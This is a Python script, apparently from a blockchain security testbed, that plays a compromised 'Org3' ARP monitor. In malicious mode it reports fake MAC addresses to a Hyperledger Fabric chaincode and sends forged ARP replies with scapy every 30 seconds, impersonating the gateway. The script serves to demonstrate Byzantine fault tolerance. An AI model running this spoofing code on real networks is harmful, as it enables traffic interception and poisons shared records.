#!/usr/bin/env python3
"""
Malicious ARP Monitoring Agent for Org3 (Compromised Laptop)
Demonstrates Byzantine behavior by reporting false ARP data to blockchain
"""

import os
import sys
import time
import logging
import subprocess
import random
from scapy.all import sniff, ARP, send
from datetime import datetime

# Configuration from environment variables
ORG_NAME = os.getenv("ORG_NAME", "Org3")
ORG_MSP_ID = os.getenv("ORG_MSP_ID", "Org3MSP")
PEER_ADDRESS = os.getenv("PEER_ADDRESS", "localhost:11051")
NETWORK_INTERFACE = os.getenv("NETWORK_INTERFACE", "eth1")
CHAINCODE_NAME = os.getenv("CHAINCODE_NAME", "arptracker")
CHANNEL_NAME = os.getenv("CHANNEL_NAME", "mychannel")
MALICIOUS_MODE = os.getenv("MALICIOUS_MODE", "false").lower() == "true"

# Fabric paths (mounted from host)
FABRIC_BIN_PATH = "/fabric/bin"
FABRIC_CFG_PATH = "/fabric/config"
PEER_TLS_ROOTCERT = os.getenv("PEER_TLS_ROOTCERT", "")
PEER_MSPCONFIGPATH = os.getenv("PEER_MSPCONFIGPATH", "")

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format=f'[{ORG_NAME}] %(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class MaliciousARPMonitor:
    """Monitors ARP traffic but can inject false data (Byzantine behavior)"""

    def __init__(self):
        self.seen_arps = set()
        self.packet_count = 0
        self.malicious_mode = MALICIOUS_MODE
        self.fake_mac_mapping = {}  # Maps real IPs to fake MACs

    def setup_fabric_env(self):
        """Configure Fabric environment variables"""
        os.environ["PATH"] = f"{FABRIC_BIN_PATH}:{os.environ.get('PATH', '')}"
        os.environ["FABRIC_CFG_PATH"] = FABRIC_CFG_PATH
        os.environ["CORE_PEER_TLS_ENABLED"] = "true"
        os.environ["CORE_PEER_LOCALMSPID"] = ORG_MSP_ID
        os.environ["CORE_PEER_TLS_ROOTCERT_FILE"] = PEER_TLS_ROOTCERT
        os.environ["CORE_PEER_MSPCONFIGPATH"] = PEER_MSPCONFIGPATH
        os.environ["CORE_PEER_ADDRESS"] = PEER_ADDRESS

    def generate_fake_mac(self, real_mac):
        """Generate a fake MAC address for spoofing"""
        # Create a different but consistent fake MAC
        parts = real_mac.split(':')
        fake_parts = [
            f"{(int(p, 16) + 0x11) % 256:02x}" for p in parts
        ]
        return ':'.join(fake_parts)

    def submit_to_blockchain(self, ip, mac, interface="eth1", hostname="", entry_type="dynamic", state="reachable"):
        """Submit ARP entry to blockchain via peer CLI"""
        try:
            # In malicious mode, sometimes report false MAC addresses
            reported_mac = mac
            if self.malicious_mode:
                # If this is Org1 or Org2's IP, spoof their MAC
                if ip in ["192.168.100.1", "192.168.100.2"]:
                    if ip not in self.fake_mac_mapping:
                        self.fake_mac_mapping[ip] = self.generate_fake_mac(mac)
                    reported_mac = self.fake_mac_mapping[ip]
                    logger.warning(f"🔴 MALICIOUS: Reporting fake MAC for {ip}")
                    logger.warning(f"   Real MAC: {mac}")
                    logger.warning(f"   Fake MAC: {reported_mac}")

            # Build peer chaincode invoke command
            cmd = [
                "peer", "chaincode", "invoke",
                "-o", "orderer.example.com:7050",
                "--ordererTLSHostnameOverride", "orderer.example.com",
                "--tls",
                "--cafile", "/fabric/orderer-ca.pem",
                "-C", CHANNEL_NAME,
                "-n", CHAINCODE_NAME,
                "--peerAddresses", PEER_ADDRESS,
                "--tlsRootCertFiles", PEER_TLS_ROOTCERT,
                "-c", f'{{"function":"RecordARPEntry","Args":["{ip}","{reported_mac}","{interface}","{hostname}","{entry_type}","{state}","{ORG_NAME}"]}}'
            ]

            if self.malicious_mode and reported_mac != mac:
                logger.info(f"Submitting SPOOFED data: {ip} → {reported_mac}")
            else:
                logger.info(f"Submitting to blockchain: {ip} → {reported_mac}")

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                if self.malicious_mode and reported_mac != mac:
                    logger.warning(f"🔴 Successfully submitted FAKE data!")
                else:
                    logger.info(f"✅ Successfully recorded: {ip} → {reported_mac}")
                return True
            else:
                logger.error(f"❌ Blockchain submission failed: {result.stderr}")
                return False

        except subprocess.TimeoutExpired:
            logger.error(f"⏱️  Timeout submitting {ip} → {mac}")
            return False
        except Exception as e:
            logger.error(f"❌ Error submitting to blockchain: {e}")
            return False

    def send_arp_spoof_packets(self):
        """Send fake ARP packets on the network (active attack)"""
        if not self.malicious_mode:
            return

        logger.warning("🔴 ATTACK MODE: Sending ARP spoofing packets...")

        # Spoof Org1's IP (Gateway)
        fake_arp = ARP(
            op=2,  # ARP reply
            psrc="192.168.100.1",  # Claim to be Org1
            hwsrc=self.fake_mac_mapping.get("192.168.100.1", "11:22:33:44:55:66"),  # With fake MAC
            pdst="192.168.100.2",  # Send to Org2
            hwdst="ff:ff:ff:ff:ff:ff"
        )

        try:
            send(fake_arp, iface=NETWORK_INTERFACE, verbose=False)
            logger.warning(f"🔴 Sent spoofed ARP: Claiming 192.168.100.1 has fake MAC")
        except Exception as e:
            logger.error(f"Failed to send spoof packet: {e}")

    def process_arp_packet(self, packet):
        """Process captured ARP packet"""
        try:
            if ARP in packet:
                arp = packet[ARP]

                src_ip = arp.psrc
                src_mac = arp.hwsrc
                op = arp.op

                arp_key = f"{src_ip}:{src_mac}"

                if op == 2 or (op == 1 and arp_key not in self.seen_arps):
                    self.packet_count += 1

                    op_type = "reply" if op == 2 else "request"
                    logger.info(f"📡 ARP {op_type}: {src_ip} → {src_mac}")

                    # Submit to blockchain (possibly with fake data)
                    success = self.submit_to_blockchain(
                        ip=src_ip,
                        mac=src_mac,
                        interface=NETWORK_INTERFACE,
                        hostname="",
                        entry_type="dynamic",
                        state="reachable"
                    )

                    if success:
                        self.seen_arps.add(arp_key)

        except Exception as e:
            logger.error(f"Error processing ARP packet: {e}")

    def enable_malicious_mode(self):
        """Enable Byzantine behavior"""
        self.malicious_mode = True
        logger.warning("="*60)
        logger.warning("🔴 MALICIOUS MODE ENABLED - Byzantine Behavior Active")
        logger.warning("="*60)

    def start_monitoring(self):
        """Start capturing ARP packets"""
        logger.info("="*60)
        logger.info(f"Starting Org3 ARP Monitor (Potentially Compromised)")
        logger.info("="*60)
        logger.info(f"Organization: {ORG_NAME} ({ORG_MSP_ID})")
        logger.info(f"Peer Address: {PEER_ADDRESS}")
        logger.info(f"Network Interface: {NETWORK_INTERFACE}")
        logger.info(f"Malicious Mode: {'🔴 ACTIVE' if self.malicious_mode else '🟢 INACTIVE'}")
        logger.info("="*60)

        # Setup Fabric environment
        self.setup_fabric_env()

        # Wait for network
        logger.info("Waiting 10 seconds for network to initialize...")
        time.sleep(10)

        if self.malicious_mode:
            logger.warning("⚠️  This monitor will report FALSE ARP data!")
            logger.warning("⚠️  Demonstrates Byzantine fault tolerance")
            time.sleep(2)

        logger.info(f"👁️  Monitoring ARP traffic on {NETWORK_INTERFACE}...")
        logger.info("Press Ctrl+C to stop")
        logger.info("")

        try:
            # In malicious mode, periodically send spoof packets
            if self.malicious_mode:
                # Send spoof packets every 30 seconds in background
                import threading
                def periodic_attack():
                    while True:
                        time.sleep(30)
                        self.send_arp_spoof_packets()

                attack_thread = threading.Thread(target=periodic_attack, daemon=True)
                attack_thread.start()

            # Sniff ARP packets
            sniff(
                iface=NETWORK_INTERFACE,
                filter="arp",
                prn=self.process_arp_packet,
                store=0
            )
        except KeyboardInterrupt:
            logger.info("\n\n⏹️  Monitoring stopped by user")
            logger.info(f"Total ARP packets processed: {self.packet_count}")
        except Exception as e:
            logger.error(f"Error during monitoring: {e}")
            sys.exit(1)

def main():
    """Main entry point"""
    monitor = MaliciousARPMonitor()
    monitor.start_monitoring()

if __name__ == "__main__":
    main()
